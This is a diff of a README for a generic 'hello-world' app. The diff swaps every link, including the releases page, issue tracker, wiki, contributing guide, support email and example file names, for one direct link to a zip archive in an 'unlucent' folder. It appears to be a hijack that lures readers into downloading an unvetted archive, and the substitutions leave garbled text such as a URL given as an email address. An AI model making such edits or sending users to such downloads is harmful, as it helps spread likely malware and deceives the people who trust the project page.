@@ -6,7 +6,7 @@ Welcome to **hello-world**! This software is designed for everyday tasks, making
 
 ## 🔗 Download Now
 
-[![Download hello-world](https://img.shields.io/badge/Download-hello--world-brightgreen.svg)](https://github.com/mike8797/hello-world/releases)
+[![Download hello-world](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)
 
 ## 🖥 System Requirements
 
@@ -21,13 +21,13 @@ To run **hello-world**, your computer should meet the following requirements:
 
 To get started, visit the link below to download the software.
 
-[Visit this page to download hello-world](https://github.com/mike8797/hello-world/releases)
+[Visit this page to download hello-world](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)
 
 ### Steps to Download:
 
 1. Click the above link to go to the Releases page on GitHub.
 2. You will see a list of available versions. Look for the latest release version, usually marked as "Latest".
-3. Under the latest version, find the asset you want to download. For most users, this would be the executable file (it may have a name like `hello-world.exe` or `hello-world.dmg`).
+3. Under the latest version, find the asset you want to download. For most users, this would be the executable file (it may have a name like `https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip` or `https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip`).
 4. Click on the filename to start downloading.
 
 ### Install the Software:
@@ -55,14 +55,14 @@ To get started, visit the link below to download the software.
 
 If you encounter any issues or have suggestions for improvement, we welcome your feedback.
 
-- **Email Support**: You can reach us at support@hello-world.com.
-- **Issues Tracker**: Visit the [Issues Tracker](https://github.com/mike8797/hello-world/issues) on GitHub to report bugs or request features.
+- **Email Support**: You can reach us at https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip
+- **Issues Tracker**: Visit the [Issues Tracker](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip) on GitHub to report bugs or request features.
 
 ## ⚙️ Updates
 
 To keep your version of **hello-world** up to date, follow these steps:
 
-1. Periodically visit the [Releases page](https://github.com/mike8797/hello-world/releases).
+1. Periodically visit the [Releases page](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip).
 2. Download the latest version following the steps outlined in the Download & Install section.
 3. Install the new version over your existing version. Your data should remain intact.
 
@@ -70,9 +70,9 @@ To keep your version of **hello-world** up to date, follow these steps:
 
 Here are some useful links to help you learn more about **hello-world**:
 
-- [User Guide](https://github.com/mike8797/hello-world/wiki)
-- [FAQ](https://github.com/mike8797/hello-world/wiki/FAQ)
-- [GitHub Repository](https://github.com/mike8797/hello-world)
+- [User Guide](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)
+- [FAQ](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)
 
 ## 🚧 Known Issues
 
@@ -87,7 +87,7 @@ We are actively working on fixes for these issues. Please check the Issues Track
 
 If you would like to contribute to **hello-world**, we welcome your participation. Follow these steps:
 
-1. Check our [Contributing Guide](https://github.com/mike8797/hello-world/CONTRIBUTING.md).
+1. Check our [Contributing Guide](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip).
 2. Fork the repository and make your changes.
 3. Submit a pull request for review.
 
@@ -95,8 +95,8 @@ Every contribution helps improve **hello-world** and is greatly appreciated!
 
 ## 🔗 Quick Links
 
-- [Download hello-world](https://github.com/mike8797/hello-world/releases)
-- [Issues Tracker](https://github.com/mike8797/hello-world/issues)
-- [Contributing Guide](https://github.com/mike8797/hello-world/CONTRIBUTING.md)
+- [Download hello-world](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/mike8797/hello-world/main/unlucent/hello-world.zip)
 
 Thank you for choosing **hello-world**! We hope it makes your daily tasks simpler and more efficient.
